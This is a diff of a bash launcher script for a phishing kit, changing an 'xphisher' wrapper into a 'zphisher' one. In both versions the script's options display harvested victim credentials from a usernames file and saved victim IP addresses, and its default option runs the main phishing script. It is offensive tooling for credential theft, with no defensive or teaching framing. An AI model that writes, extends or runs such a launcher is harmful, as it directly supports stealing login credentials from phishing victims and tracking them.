@@ -1,53 +1,32 @@
 #!/bin/bash
 
-# https://github.com/akrakib/xphisher
+# https://github.com/htr-tech/zphisher
 
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
-
-if [[ $(uname -o) == *'Android'* ]]; then
-    XPHISHER_ROOT="/data/data/com.termux/files/usr/opt/xphisher"
-elif [[ -f "$REPO_ROOT/xphisher.sh" ]]; then
-    XPHISHER_ROOT="$REPO_ROOT"
-elif [[ -f "/opt/xphisher/xphisher.sh" ]]; then
-    XPHISHER_ROOT="/opt/xphisher"
+if [[ $(uname -o) == *'Android'* ]];then
+	ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
 else
-    XPHISHER_ROOT="$REPO_ROOT"
+	export ZPHISHER_ROOT="/opt/zphisher"
 fi
 
-case "${1:-}" in
-    -h|help)
-        echo "To run Xphisher type \`xphisher\` in your cmd"
-        echo
-        echo "Help:"
-        echo " -h | help : Print this menu & Exit"
-        echo " -c | auth : View Saved Credentials"
-        echo " -i | ip   : View Saved Victim IP"
-        echo
-        ;;
-    -c|auth)
-        if [[ -f "$XPHISHER_ROOT/auth/usernames.dat" ]]; then
-            cat "$XPHISHER_ROOT/auth/usernames.dat"
-        else
-            echo "No Credentials Found !"
-            exit 1
-        fi
-        ;;
-    -i|ip)
-        if [[ -f "$XPHISHER_ROOT/auth/ip.txt" ]]; then
-            cat "$XPHISHER_ROOT/auth/ip.txt"
-        else
-            echo "No Saved IP Found !"
-            exit 1
-        fi
-        ;;
-    *)
-        if [[ -f "$XPHISHER_ROOT/xphisher.sh" ]]; then
-            cd "$XPHISHER_ROOT"
-            bash "$XPHISHER_ROOT/xphisher.sh" "$@"
-        else
-            echo "Unable to locate xphisher.sh in $XPHISHER_ROOT"
-            exit 1
-        fi
-        ;;
-esac
+if [[ $1 == '-h' || $1 == 'help' ]]; then
+	echo "To run Zphisher type \`zphisher\` in your cmd"
+	echo
+	echo "Help:"
+	echo " -h | help : Print this menu & Exit"
+	echo " -c | auth : View Saved Credentials"
+	echo " -i | ip   : View Saved Victim IP"
+	echo
+elif [[ $1 == '-c' || $1 == 'auth' ]]; then
+	cat $ZPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
+		echo "No Credentials Found !"
+		exit 1
+	}
+elif [[ $1 == '-i' || $1 == 'ip' ]]; then
+	cat $ZPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
+		echo "No Saved IP Found !"
+		exit 1
+	}
+else
+	cd $ZPHISHER_ROOT
+	bash ./zphisher.sh
+fi
